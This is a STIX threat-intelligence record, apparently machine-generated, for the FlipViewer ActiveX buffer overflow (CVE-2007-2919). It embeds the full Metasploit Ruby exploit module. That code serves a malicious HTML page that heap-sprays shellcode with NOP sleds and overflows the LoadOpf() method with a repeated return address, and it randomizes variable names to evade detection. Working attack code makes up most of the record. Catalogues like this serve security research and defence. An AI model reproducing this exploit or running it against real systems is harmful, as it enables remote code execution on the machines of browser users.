{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--5b98a710-9d02-46b2-9310-1ca94999f116",
    "created": "2024-08-14T16:41:53.952332Z",
    "modified": "2024-08-14T16:41:53.952336Z",
    "name": "FlipViewer FViewerLoading ActiveX Control Buffer Overflow",
    "description": " This module exploits a stack buffer overflow in E-BOOK Systems FlipViewer 4.0. The vulnerability is caused due to a boundary error in the FViewerLoading (FlipViewerX.dll) ActiveX control when handling the \"LoadOpf()\" method.  'License'        => BSD_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/browser/ebook_flipviewer_fviewerloading.rb",
            "external_id": "ebook_flipviewer_fviewerloading.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2007-2919"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::HttpServer::HTML\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'FlipViewer FViewerLoading ActiveX Control Buffer Overflow',\n      'Description'    => %q{\n        This module exploits a stack buffer overflow in E-BOOK Systems FlipViewer 4.0.\n        The vulnerability is caused due to a boundary error in the\n        FViewerLoading (FlipViewerX.dll) ActiveX control when handling the\n        \"LoadOpf()\" method.\n      },\n      'License'        => BSD_LICENSE,\n      'Author'         => [ 'LSO <lso[at]hushmail.com>' ],\n      'References'     =>\n        [\n          [ 'CVE', '2007-2919' ],\n          [ 'OSVDB', '37042' ],\n          [ 'BID', '24328' ],\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'process',\n        },\n      'Payload'        =>\n        {\n          'Space'         => 1024,\n          'BadChars'      => \"\\x00\",\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          # Tested ok aushack 20090303\n          [ 'Windows XP SP0-SP3 / Windows Vista / IE 6.0 SP0-SP2 / IE 7', { 'Ret' => 0x0A0A0A0A } ],\n        ],\n      'DisclosureDate' => '2007-06-06',\n      'DefaultTarget'  => 0))\n  end\n\n  def autofilter\n    false\n  end\n\n  def check_dependencies\n    use_zlib\n  end\n\n  def on_request_uri(cli, request)\n    return if ((p = regenerate_payload(cli)) == nil)\n\n    shellcode = Rex::Text.to_unescape(payload.encoded, Rex::Arch.endian(target.arch))\n\n    nops    = Rex::Text.to_unescape(make_nops(4))\n    randnop = rand_text_alpha(rand(100) + 1)\n\n    ret     = Rex::Text.uri_encode([target.ret].pack('L'))\n\n    vname  = rand_text_alpha(rand(100) + 1)\n    var_i  = rand_text_alpha(rand(30)  + 2)\n    rand1  = rand_text_alpha(rand(100) + 1)\n    rand2  = rand_text_alpha(rand(100) + 1)\n    rand3  = rand_text_alpha(rand(100) + 1)\n    rand4  = rand_text_alpha(rand(100) + 1)\n    rand5  = rand_text_alpha(rand(100) + 1)\n    rand6  = rand_text_alpha(rand(100) + 1)\n    rand7  = rand_text_alpha(rand(100) + 1)\n    rand8  = rand_text_alpha(rand(100) + 1)\n\n    content = %Q|<html>\n<object classid='clsid:BA83FD38-CE14-4DA3-BEF5-96050D55F78A' id='#{vname}'></object>\n<script language='javascript'>\nvar #{rand1} = unescape('#{shellcode}');\nvar #{randnop} = \"#{nops}\";\nvar #{rand2} = unescape(#{randnop});\nvar #{rand3} = 20;\nvar #{rand4} = #{rand3} + #{rand1}.length;\nwhile (#{rand2}.length < #{rand4}) #{rand2} += #{rand2};\nvar #{rand5} = #{rand2}.substring(0,#{rand4});\nvar #{rand6} = #{rand2}.substring(0,#{rand2}.length - #{rand4});\nwhile (#{rand6}.length + #{rand4} < 0x40000) #{rand6} = #{rand6} + #{rand6} + #{rand5};\nvar #{rand7} = new Array();\nfor (#{var_i} = 0; #{var_i} < 400; #{var_i}++){ #{rand7}[#{var_i}] = #{rand6} + #{rand1} }\nvar #{rand8} = \"\";\nfor (#{var_i} = 0; #{var_i} < 1324; #{var_i}++) { #{rand8} = #{rand8} + unescape('#{ret}') }\n#{vname}.LoadOpf(#{vname}, #{vname}, #{vname}, #{vname}, #{vname}, #{vname}, #{vname}, #{rand8});\n</script>\n</html>\n|\n\n    content = Rex::Text.randomize_space(content)\n\n    print_status(\"Sending exploit...\")\n\n    send_response_html(cli, content)\n\n    handler(cli)\n  end\nend\n",
    "x_mitre_disclosure_date": "2007-06-06",
    "x_mitre_platforms": [
        "win'"
    ]
}